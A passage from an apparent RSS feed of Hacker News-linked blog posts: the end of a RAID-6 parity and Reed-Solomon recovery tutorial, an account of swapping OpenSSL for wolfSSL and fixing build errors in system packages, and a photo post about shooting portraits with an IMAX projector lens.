PD[2] = D1[2] xor D2[2] xor D3[2]
PD[3] = D1[3] xor D2[3] xor D3[3]
PD[4] = D1[4] xor D2[4] xor D3[4]
</span></code></pre>
<p>Example:</p>
<pre><code><span>PD[0] = 0x66 xor 0x73 xor 0x74  =&gt;  0x61
PD[1] = 0x69 xor 0x65 xor 0x63  =&gt;  0x64
PD[2] = 0x72 xor 0x63 xor 0x69  =&gt;  0x78
PD[3] = 0x73 xor 0x6e xor 0x72  =&gt;  0x6f
PD[4] = 0x74 xor 0x64 xor 0x64  =&gt;  0x74
</span></code></pre>
<p>Yes, it's that simple. Do it for the whole drives (in our case, 5 bytes), and you'll have the properly generated <code>PD</code> drive:</p>
<table><thead><tr><th>Disk</th><th>Data in HEX</th></tr></thead><tbody>
<tr><td><code>PD</code></td><td>0x61, 0x64, 0x78, 0x6f, 0x74</td></tr>
</tbody></table>
<p>So, in case when only your <code>PD</code> drive will fail, you can see it's trivial to regenerate it from the data drives <code>D1</code>, <code>D2</code> and <code>D3</code>.</p>

<p>By the way, this is how RAID-5 error recovery works. If only one drive with user data will fail, we can use the <code>PD</code> drive to recalculate missing user data.</p>
<p>Let's say we're losing <code>D2</code>, so the drives that are still working are: <code>D1</code>, <code>D3</code>, <code>PD</code> and <code>RS</code>. In this case, we don't even look at <code>RS</code>. All we need are the <code>D1</code>, <code>D3</code> and <code>PD</code> drives. To calculate missing data, you can use the XOR function again, like in the previous point.</p>
<p>To recover user data from offset 0, XOR the bytes from offsets 0 of disks with user data you haven't lost (<code>D1</code> and <code>D3</code>) together with the byte from offset 0 from the <code>PD</code> drive. Do the same thing for offset 1, like this:</p>
<pre><code><span>D2[0] = D1[0] xor D3[0] xor PD[0]
D2[1] = D1[1] xor D3[1] xor PD[1]
D2[2] = D1[2] xor D3[2] xor PD[2]
D2[3] = D1[3] xor D3[3] xor PD[3]
D2[4] = D1[4] xor D3[4] xor PD[4]
</span></code></pre>
<p>Example:</p>
<pre><code><span>D2[0] = 0x66 xor 0x74 xor 0x61  =&gt;  0x73 (s)
D2[1] = 0x69 xor 0x63 xor 0x64  =&gt;  0x65 (e)
D2[2] = 0x72 xor 0x69 xor 0x78  =&gt;  0x63 (c)
D2[3] = 0x73 xor 0x72 xor 0x6f  =&gt;  0x6e (n)
D2[4] = 0x74 xor 0x64 xor 0x74  =&gt;  0x64 (d)
</span></code></pre>
<p>As you can see, we can easily recover data from the missing drive. It doesn't matter which drive is missing; the <a href="https://en.wikipedia.org/wiki/Bitwise_operation#XOR">XOR function</a> will work anyway.</p>

<p>Now we enter the realm of the Reed-Solomon codes and Galois fields. But don't worry, you don't have to be a mathematician in order to <em>use</em> it.</p>
<p>When we lose only <code>RS</code> drive, or when we initialize a new RAID-6-like redundation system, we simply need to regenerate it. In order to do that, we need to use the <code>gflog</code> and <code>gfilog</code> tables, which are always constant, plus data from our existing data drives <code>D1</code>, <code>D2</code> and <code>D3</code>.</p>
<p>This is the <code>gflog</code> table, it always stays the same:</p>
<pre><code><span>    0x00, 0x00, 0x01, 0x19, 0x02, 0x32, 0x1a, 0xc6, 0x03, 0xdf, 0x33, 0xee, 0x1b, 0x68, 0xc7, 0x4b,
    0x04, 0x64, 0xe0, 0x0e, 0x34, 0x8d, 0xef, 0x81, 0x1c, 0xc1, 0x69, 0xf8, 0xc8, 0x08, 0x4c, 0x71,
    0x05, 0x8a, 0x65, 0x2f, 0xe1, 0x24, 0x0f, 0x21, 0x35, 0x93, 0x8e, 0xda, 0xf0, 0x12, 0x82, 0x45,
    0x1d, 0xb5, 0xc2, 0x7d, 0x6a, 0x27, 0xf9, 0xb9, 0xc9, 0x9a, 0x09, 0x78, 0x4d, 0xe4, 0x72, 0xa6,
    0x06, 0xbf, 0x8b, 0x62, 0x66, 0xdd, 0x30, 0xfd, 0xe2, 0x98, 0x25, 0xb3, 0x10, 0x91, 0x22, 0x88,
    0x36, 0xd0, 0x94, 0xce, 0x8f, 0x96, 0xdb, 0xbd, 0xf1, 0xd2, 0x13, 0x5c, 0x83, 0x38, 0x46, 0x40,
    0x1e, 0x42, 0xb6, 0xa3, 0xc3, 0x48, 0x7e, 0x6e, 0x6b, 0x3a, 0x28, 0x54, 0xfa, 0x85, 0xba, 0x3d,
    0xca, 0x5e, 0x9b, 0x9f, 0x0a, 0x15, 0x79, 0x2b, 0x4e, 0xd4, 0xe5, 0xac, 0x73, 0xf3, 0xa7, 0x57,
    0x07, 0x70, 0xc0, 0xf7, 0x8c, 0x80, 0x63, 0x0d, 0x67, 0x4a, 0xde, 0xed, 0x31, 0xc5, 0xfe, 0x18,
    0xe3, 0xa5, 0x99, 0x77, 0x26, 0xb8, 0xb4, 0x7c, 0x11, 0x44, 0x92, 0xd9, 0x23, 0x20, 0x89, 0x2e,
    0x37, 0x3f, 0xd1, 0x5b, 0x95, 0xbc, 0xcf, 0xcd, 0x90, 0x87, 0x97, 0xb2, 0xdc, 0xfc, 0xbe, 0x61,
    0xf2, 0x56, 0xd3, 0xab, 0x14, 0x2a, 0x5d, 0x9e, 0x84, 0x3c, 0x39, 0x53, 0x47, 0x6d, 0x41, 0xa2,
    0x1f, 0x2d, 0x43, 0xd8, 0xb7, 0x7b, 0xa4, 0x76, 0xc4, 0x17, 0x49, 0xec, 0x7f, 0x0c, 0x6f, 0xf6,
    0x6c, 0xa1, 0x3b, 0x52, 0x29, 0x9d, 0x55, 0xaa, 0xfb, 0x60, 0x86, 0xb1, 0xbb, 0xcc, 0x3e, 0x5a,
    0xcb, 0x59, 0x5f, 0xb0, 0x9c, 0xa9, 0xa0, 0x51, 0x0b, 0xf5, 0x16, 0xeb, 0x7a, 0x75, 0x2c, 0xd7,
    0x4f, 0xae, 0xd5, 0xe9, 0xe6, 0xe7, 0xad, 0xe8, 0x74, 0xd6, 0xf4, 0xea, 0xa8, 0x50, 0x58, 0xaf.
</span></code></pre>
<p>This is the <code>gfilog</code> table, it's also constant:</p>
<pre><code><span>    0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1d, 0x3a, 0x74, 0xe8, …</span></code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://anadoxin.org/blog/error-recovery-in-raid6.html/">http://anadoxin.org/blog/error-recovery-in-raid6.html/</a></em></p>]]>
            </description>
            <link>http://anadoxin.org/blog/error-recovery-in-raid6.html/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25666830</guid>
            <pubDate>Thu, 07 Jan 2021 03:13:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Replacing OpenSSL, Part 1: WolfSSL]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25666301">thread link</a>) | @harporoeder
<br/>
January 6, 2021 | https://danyspin97.org/blog/replacing-openssl-part-1-wolfssl/ | <a href="https://web.archive.org/web/*/https://danyspin97.org/blog/replacing-openssl-part-1-wolfssl/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This post highlight my experiment of replacing OpenSSL cryptographic library
with its embedded competitor: <code>wolfssl</code>.</p><p><em><strong>Prerequites</strong></em>: <em>Basic knowledge about C/C++ programming</em>.</p><h2 id="a-bit-of-background-about-openssl">A bit of background about OpenSSL</h2><p>OpenSSL is one of the most crucial libraries on a Unix system: it performs
cryptographic functions and it provides <em>Transport Layer Security</em> (<em>TLS</em>) and <em>Secure Sockets Layer</em> (<em>SSL</em>) protocols to applications.</p><p>According to the <em>Arch Linux</em> <a href="https://archlinux.org/packages/core/x86_64/openssl/">OpenSSL package</a>, <strong>355</strong> packages, out of the
<em>11523</em> available, depend on it. You can find it installed on any Unix system
(and on Windows too!).</p><p>It started in 1998 as a fork of <a href="https://en.wikipedia.org/wiki/SSLeay">SSLeay</a> and it has been in development since.
Two full-time developers work on it, as well as many volunteers.</p><p>Fast forward to 2014: a <em><a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures">CVE</a></em> had been issued regarding a high risk
vulnerability found in OpenSSL. It has been given the name <strong><a href="https://heartbleed.com/">Heartbleed</a></strong>,
because it has been found in the <em>TLS</em>/<em>DTLS</em> heartbeat extension (<a href="https://tools.ietf.org/html/rfc6520">RFC6520</a>).
This vulnerability allowed attackers to steal sensitive data, such as secret
keys, user names and passwords.</p><p>All the community turned to the OpenSSL project, weighting its implementation
and security policy. Heartbleed have been promptly fixed, but there could be new
vulnerabilities in the future, if security was not properly prioritized during
development.</p><p>At this point, OpenBSD’s folks forked OpenSSL and started a new project:
<a href="https://www.libressl.org/">LibreSSL</a>. It primary goals were to <strong>modernize the codebase and to improve
its security</strong>. This new project hasn’t been adopted by big distributions such
Ubuntu and Arch Linux; instead smaller distributions (at that time) replaced
OpenSSL with LibreSSL on their default configuration, such as Alpine and Void.</p><p>In the last years, LibreSSL have seen a decline in its usage. Alpine switched
back to OpenSSL (<a href="https://lists.alpinelinux.org/~alpine/devel/%3C20181011171746.4c01f758%40ncopa-desktop.copa.dup.pw%3E">link to the thread</a>). Many people and distributions are
considering doing the same, since OpenSSL got the improvement that LibreSSL
aimed for. And it’s still the <em>de facto standard</em> cryptographic library on Unix.</p><h2 id="why-replacing-openssl-now">Why replacing OpenSSL now?</h2><p>OpenSSL works fine, there is no denying that. Every software has <em>out of the box
support for it</em> so it costs no effort in term of additional mainteinance.
However, there are <strong>newer and lighter TLS and SSL implementations</strong>, which many
folks might prefer over the heavy OpenSSL’s one. I, too, prefer lightweight
libraries.</p><p>I am uninstalling LibreSSL on my systems, therefore this might be the perfect
time to experiment with something different. I have found an interesting (and
well done!) library called <em><strong><a href="https://wolfssl.com/">wolfSSL</a></strong></em> that claims to have an <em>OpenSSL
compatibility layer</em>. It also claims to be 20 times smaller than OpenSSL.</p><h2 id="installation">Installation</h2><p><strong>wolfSSL</strong> is a small C library; It uses <em>autotools</em> to build and <strong>CMake</strong>
support is being added (sigh!). Upon running <code>configure</code>, I am overwhelmed by
the quantity of compile options available.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/wolf-ssl-configure.jpg" alt=""><figcaption>some of the wolfSSL configure options</figcaption></figure><p>Fortunately, there is one comfy option which I’ve used
when compiling wolfSSL: <code>--enable-all</code>. It enables all options, including
the OpenSSL compatibility layer and leaves out the <em>SSL 3</em> protocol.</p><p>Upon completing the build and installation (which takes a couple of
minutes), a library <code>libwolfssl.so</code> will be installed into <code>/usr/lib</code>, as
well as a pkgconfig file (<code>wolfssl.pc</code>) and all the headers.</p><h2 id="out-of-the-box-support">Out of the box support</h2><p>Key applications provide support for different SSL implementations other than
OpenSSL. For example <em>curl</em> supports <em>mbedTLS</em>, <em>BearSSL</em> and our <strong>wolfSSL</strong>.
To compile <em>curl</em> using wolfSSL, we just need to add <code>--with-ssl=wolfssl</code> and
we’re done. I am aware of only two packages that have out of the box support
for wolfSSL and they are <em>curl</em> and <em><a href="https://gitlab.com/gnuwget/wget2">wget2</a></em> (not the legacy version!).</p><h2 id="openssl-compatibility">OpenSSL compatibility</h2><p><code>--enable-all</code> configure option enabled the OpenSSL compatibility layer.
To use this layer, according to the <a href="https://www.wolfssl.com/docs/wolfssl-manual/ch13/">documentation</a>, we need to link the wolfssl
library manually by adding <code>-lwolfssl</code> as link argument. We also need to
include the path <code>/usr/include/wolfssl</code> so that the OpenSSL headers in
<code>/usr/include/wolfssl/openssl</code> will be picked up.</p><p>This way both wolfSSL and OpenSSL can coexist on the same system and the latter
can be replaced on a per project basis. However, that’s not what we want since
want to replace OpenSSL at a system level.</p><p>Adding the link flag to each package on the system or patching one by one
is not an option as it would take too much time. Let’s instead apply some
workarounds.</p><p>First, we create a symlink for the headers:</p><div><pre><code data-lang="bash">$ sudo ln -sf /usr/include/wolfssl/openssl /usr/include/openssl
</code></pre></div><p>Then we create a symlink for each library. OpenSSL provides the following
libraries:</p><ul><li><code>libssl.so</code></li><li><code>libcrypto.so</code></li></ul><p>So we can run:</p><div><pre><code data-lang="bash">$ sudo ln -sf /usr/lib/libwolfssl.so /usr/lib/libssl.so
$ sudo ln -sf /usr/lib/libwolfssl.so /usr/lib/libcrypto.so
</code></pre></div><h3 id="fixing-pkg-config">Fixing pkg-config</h3><p>Some software rely on pkg-config for checking OpenSSL dependency since
it provides the following pkg-config files:</p><ul><li><code>libssl.pc</code></li><li><code>libcrypto.pc</code></li><li><code>openssl.pc</code></li></ul><p>My system doesn’t currently have either OpenSSL or LibreSSL installed, so any
attempt to include OpenSSL by using pkg-config will fail. We can fix this by
adding a pkg-config file in <code>/usr/lib/pkgconfig/openssl.pc</code>:</p><pre><code>prefix=/usr/x86_64-pc-linux-musl
includedir=${prefix}/include/wolfssl

Name: openssl
Description: wolfssl C library.
Version: 4.6.0
Requires: wolfssl
Cflags: -I${includedir}
</code></pre><p>Our pkg-config file will include the correct directory containing the OpenSSL
headers. It will also import cflags and link flags from the wolfssl pkg-config.
Let’s try if it works as intended:</p><div><pre><code data-lang="bash">$ pkg-config --cflags --libs openssl
-I/usr/x86_64-pc-linux-musl/include/wolfssl -lwolfssl
</code></pre></div><p>Yes! Now we just need create symlinks the other two pkg-config files:</p><div><pre><code data-lang="bash">$ sudo ln -sf /usr/lib/pkgconfig/openssl.pc /usr/lib/pkgconfig/libssl.pc
$ sudo ln -sf /usr/lib/pkgconfig/openssl.pc /usr/lib/pkgconfig/libcrypto.pc
</code></pre></div><p>Now we’re ready to compile system packages.</p><h2 id="compiling-system-packages">Compiling system packages</h2><p>Before actually going further into the various compile results, there are few
general changes that I’ve done:</p><ol><li>Include the default <code>/usr/include/wolfssl/option.h</code> provided in
<code>/usr/include/wolfssl/wolfcrypt/setting.h</code>. This way we will have a bunch of
defines already included that enable many wolfSSL features.</li><li>Remove some defines from <code>option.h</code> that disable old OpenSSL features, like
old SSL names. While I understand that these features are plainly old (or even
deprecated), projects will still use them as long as they haven’t been
removed upstream.</li><li>Define <code>OPENSSL_NO_WHIRPOOL</code> in the same header as above, since this feature
ins’t implemented in wolfSSL. There are other <code>OPENSSL_NO_*</code> defines there for
unimplemented features, but this one was missing.</li></ol><h3 id="wget">wget</h3><p><em><a href="https://www.gnu.org/software/wget/">wget</a></em>, which comes installed on any Unix system, is the first software we’ll
try building with wolfSSL and its OpenSSL compatibility layer.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/wget-error-1.jpg" alt=""><figcaption>wget compile error</figcaption></figure><p>wget complains about two undeclared identifiers:</p><ul><li><code>CONF_MFLAGS_DEFAULT_SECTION</code></li><li><code>CONF_MFLAGS_IGNORE_MISSING_FILE</code></li></ul><p>We can fix this by adding the defines from the OpenSSL file <code>openssl/conf.h</code>
to <code>/usr/include/wolfssl/option.h</code>:</p><div><pre><code data-lang="c"><span># define CONF_MFLAGS_IGNORE_MISSING_FILE 0x10
</span><span># define CONF_MFLAGS_DEFAULT_SECTION     0x20
</span></code></pre></div><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/wget-error-2.jpg" alt=""><figcaption>wget link-time errors about missing symbols</figcaption></figure><p>We arrived at link-time, that’s huge! However, there are 8 undefined symbols:
6 symbols about unimplemented features in wolfSSL, such as <code>i2d_x509_PUBKEY</code>
and <code>a2i_IPADDRESS</code>; 2 symbols regarding wolfSSL functions. The latter could
probably be fixed by adding the proper compile time option to wolfSSL, like
<code>--enable-sslv3</code>.</p><h3 id="rhash">rhash</h3><p>rhash is an utility that calculates and verifies message digests, such as
<em>SHA256</em> and <em>MD5</em>. It is required by CMake, so we can consider it an essential
package. Compiling rhash led to many errors. Let’s look in depth at some of
them.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/rhash-error-1.jpg" alt=""><figcaption>rhash compile error about RIPEMD160_CTX</figcaption></figure><p><em>rhash</em> uses <code>RIPEMD160_CTX</code> which is not implemented by wolfSSL.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/rhash-error-2.jpg" alt=""><figcaption>rhash compile error about WOLFSSL_MD5_CTX</figcaption></figure><p>This time, rhash access a member of <code>MD5_CTX</code> (which wolfSSL has replaced by
<code>WOLFSSL_MD5_CTX</code>) using <code>offsetof</code>. The original <code>MD5_CTX</code> struct looks like
this:</p><div><pre><code data-lang="c"><span>typedef</span> <span>struct</span> <span>MD5state_st</span> <span>{</span>
    <span>MD5_LONG</span> <span>A</span><span>,</span> <span>B</span><span>,</span> <span>C</span><span>,</span> <span>D</span><span>;</span>
    <span>MD5_LONG</span> <span>Nl</span><span>,</span> <span>Nh</span><span>;</span>
    <span>MD5_LONG</span> <span>data</span><span>[</span><span>MD5_LBLOCK</span><span>];</span>
    <span>unsigned</span> <span>int</span> <span>num</span><span>;</span>
<span>}</span> <span>MD5_CTX</span><span>;</span>
</code></pre></div><p><code>WOLFSSL_MD5_CTX</code> instead looks like this:</p><div><pre><code data-lang="c"><span>typedef</span> <span>struct</span> <span>WOLFSSL_MD5_CTX</span> <span>{</span>
    <span>/* big enough to hold wolfcrypt md5, but check on init */</span>
<span>#ifdef STM32_HASH
</span><span></span>    <span>void</span><span>*</span> <span>holder</span><span>[(</span><span>112</span> <span>+</span> <span>WC_ASYNC_DEV_SIZE</span> <span>+</span> <span>sizeof</span><span>(</span><span>STM32_HASH_Context</span><span>))</span> <span>/</span> <span>sizeof</span><span>(</span><span>void</span><span>*</span><span>)];</span>
<span>#else
</span><span></span>    <span>void</span><span>*</span> <span>holder</span><span>[(</span><span>112</span> <span>+</span> <span>WC_ASYNC_DEV_SIZE</span><span>)</span> <span>/</span> <span>sizeof</span><span>(</span><span>void</span><span>*</span><span>)];</span>
<span>#endif
</span><span></span><span>}</span> <span>WOLFSSL_MD5_CTX</span><span>;</span>
</code></pre></div><p>I think that this incosistency between OpenSSL and wolfSSL structs <em>will</em>
happen again with different data types.</p><h3 id="libssh2">libssh2</h3><p>From the official <a href="https://www.libssh2.org/">libssh2</a> site:</p><blockquote><p><em>libssh2 a client-side C library implementing the SSH2 protocol</em></p></blockquote><p>curl has a hard dependency on libssh2, so we can consider it another essential
package.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/libssh2-error-1.jpg" alt=""><figcaption>libssh2 build errors</figcaption></figure><p>This time there are only 2 errors, both about unimplemented features:
<code>EVP_bf_cbc</code> and <code>EVP_cast5_cbc</code>. The man pages are the best source of
information about OpenSSL functions; we can browse them by running:</p><div><pre><code data-lang="bash">$ man EVP
$ man EVP_bf_cbc
$ man EVP_cast5_cbc
</code></pre></div><p>Let’s split the names and study each part:</p><ul><li><code>EVP</code> is a high-level interface to cryptographic functions</li><li><code>bf</code> and <code>cast5</code> are the name of the algorithms, <em><a href="https://en.wikipedia.org/wiki/Blowfish_(cipher)">blowfish</a></em> and <em><a href="https://en.wikipedia.org/wiki/CAST-128">CAST</a></em>
respectively.</li><li><code>cbc</code>, <em><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#:~:text=Cipher%20block%20chaining%20(CBC),-CBC&amp;text=In%20CBC%20mode%2C%20each%20block,used%20in%20the%20first%20block.">Cipher Block Chaining</a></em>, is a mode of operation that tells OpenSSL
to operate on each block seperately from the others.</li></ul><p>Operating cryptographic functions in <em>CBC</em> mode isn’t really safe nor the
two algorithms above are really popular, so I understand why wolfSSL developers
might have prioritized other things over implementing the two functions above.</p><h3 id="ffmpeg">ffmpeg</h3><p><em><a href="https://ffmpeg.org/">ffmpeg</a></em> is a powerful library and a collection of utilities for handling
images, audio and videos. It is required by <em>Firefox</em>, <em>Chromium</em>, <em>mpv</em> and
another hundred and a half software (at least). We surely don’t want a system
without this library.</p><figure><img src="https://danyspin97.org/img/replacing-openssl-part-1-wolfssl/ffmpeg-error.jpg" alt=""><figcaption>ffmpeg build error</figcaption></figure><p>This time there is only one error (but others may still pop up later while
building!). The function <code>BN_sub_word</code> is missing. According to the man pages,
it is the arithmetic function that perform subtractions on big integers.
This seems pretty straightforward …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://danyspin97.org/blog/replacing-openssl-part-1-wolfssl/">https://danyspin97.org/blog/replacing-openssl-part-1-wolfssl/</a></em></p>]]>
            </description>
            <link>https://danyspin97.org/blog/replacing-openssl-part-1-wolfssl/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25666301</guid>
            <pubDate>Thu, 07 Jan 2021 02:01:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shooting photos with an IMAX projector lens]]>
            </title>
            <description>
<![CDATA[
Score 168 | Comments 63 (<a href="https://news.ycombinator.com/item?id=25666217">thread link</a>) | @dmitrygr
<br/>
January 6, 2021 | https://theslantedlens.com/2021/crazy-huge-imax-lens-amazing-street-portraits/ | <a href="https://web.archive.org/web/*/https://theslantedlens.com/2021/crazy-huge-imax-lens-amazing-street-portraits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>What the heck is that huge lens? That Crazy Huge Lens is an IMAX Lens. You will be surprised at the cool street portraits we got with this thing. Take a look at how Jay P rigged this with his <a href="https://bhpho.to/38bRbgL">Canon EOS R</a> camera and the amazing results.</p>
<p><iframe width="750" height="450" src="https://www.youtube.com/embed/D-ihZrP4C0A" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="allowfullscreen"></iframe></p>
<p>This is Jay P Morgan. Today on The Slanted Lens we are in Santa Monica at a skate park. <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_8.png" alt="" width="1092" height="611" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_8.png 1092w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_8-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_8-768x430.png 768w" sizes="(max-width: 1092px) 100vw, 1092px">This is a great skate park. I’ve been here before with my daughter who comes down to skate. <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_35.png" alt="" width="1070" height="600" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_35.png 1070w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_35-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_35-768x431.png 768w" sizes="(max-width: 1070px) 100vw, 1070px">This time I came with this huge IMAX lens. <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_1.png" alt="" width="1072" height="598" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_1.png 1072w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_1-300x167.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_1-768x428.png 768w" sizes="(max-width: 1072px) 100vw, 1072px">This thing is a beast. It’s an IMAX lens and it was made by Iwerks. I’ve had it in a huge hard case in my storage for a long, long time. I’ve always wanted to adapt this to a camera and take portraits with it. <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_2.png" alt="" width="1071" height="601" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_2.png 1071w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_2-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_2-768x431.png 768w" sizes="(max-width: 1071px) 100vw, 1071px">So I want to do street portraits with an IMAX Lens using my Canon EOS R Camera. So here’s the process I went through to get this lens adapted, so I’ll be able to focus it and work with it.</p>
<p><img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_9.png" alt="" width="1090" height="611" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_9.png 1090w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_9-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_9-768x431.png 768w" sizes="(max-width: 1090px) 100vw, 1090px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_10.png" alt="" width="1093" height="612" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_10.png 1093w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_10-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_10-768x430.png 768w" sizes="(max-width: 1093px) 100vw, 1093px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_11.png" alt="" width="1092" height="612" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_11.png 1092w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_11-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_11-768x430.png 768w" sizes="(max-width: 1092px) 100vw, 1092px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_12.png" alt="" width="1091" height="612" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_12.png 1091w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_12-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_12-768x431.png 768w" sizes="(max-width: 1091px) 100vw, 1091px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_14.png" alt="" width="1091" height="611" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_14.png 1091w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_14-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_14-768x430.png 768w" sizes="(max-width: 1091px) 100vw, 1091px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_15.png" alt="" width="1086" height="610" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_15.png 1086w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_15-300x169.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_15-768x431.png 768w" sizes="(max-width: 1086px) 100vw, 1086px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_16.png" alt="" width="1094" height="610" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_16.png 1094w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_16-300x167.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_16-768x428.png 768w" sizes="(max-width: 1094px) 100vw, 1094px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_17.png" alt="" width="1091" height="610" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_17.png 1091w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_17-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_17-768x429.png 768w" sizes="(max-width: 1091px) 100vw, 1091px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_18.png" alt="" width="1088" height="610" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_18.png 1088w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_18-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_18-768x431.png 768w" sizes="(max-width: 1088px) 100vw, 1088px">Let’s take some pictures. The way I focus this thing is so silly. <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_20.png" alt="" width="1092" height="611" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_20.png 1092w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_20-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_20-768x430.png 768w" sizes="(max-width: 1092px) 100vw, 1092px">I have a track that I can release here and I can move my camera back and forth inside this tape I put around the lens. Then I find the point where it focuses. It’s pretty gorilla. Very, very gorilla, but it works.<img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_25.png" alt="" width="1072" height="599" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_25.png 1072w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_25-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_25-768x429.png 768w" sizes="(max-width: 1072px) 100vw, 1072px"></p>
<p>So in this situation I don’t have a lens on the front of the camera. So if the camera is going to fire without a lens on it, you have to go to the menus and you’ve have to turn on the setting which will allow the camera to fire when there’s no lens attached. There’s no coupling here. <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_26.png" alt="" width="1071" height="600" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_26.png 1071w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_26-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_26-768x430.png 768w" sizes="(max-width: 1071px) 100vw, 1071px">This is just a space between the lens and the front of the camera. I did have to turn that feature on that will allow me to shoot without a lens in order to make this work.</p>
<p><img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_28.png" alt="" width="1070" height="599" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_28.png 1070w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_28-300x168.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_28-768x430.png 768w" sizes="(max-width: 1070px) 100vw, 1070px"> <img loading="lazy" src="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_29.png" alt="" width="1070" height="597" srcset="https://theslantedlens.com/wp-content/uploads/2021/01/Imax_29.png 1070w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_29-300x167.png 300w, https://theslantedlens.com/wp-content/uploads/2021/01/Imax_29-768x429.png 768w" sizes="(max-width: 1070px) 100vw, 1070px">This lens is so interesting because it has a 180 degree angle of view. So I can get right here close and to the side and I’m in the shot. And I am in the shot when I move all the way around to the other side.</p>
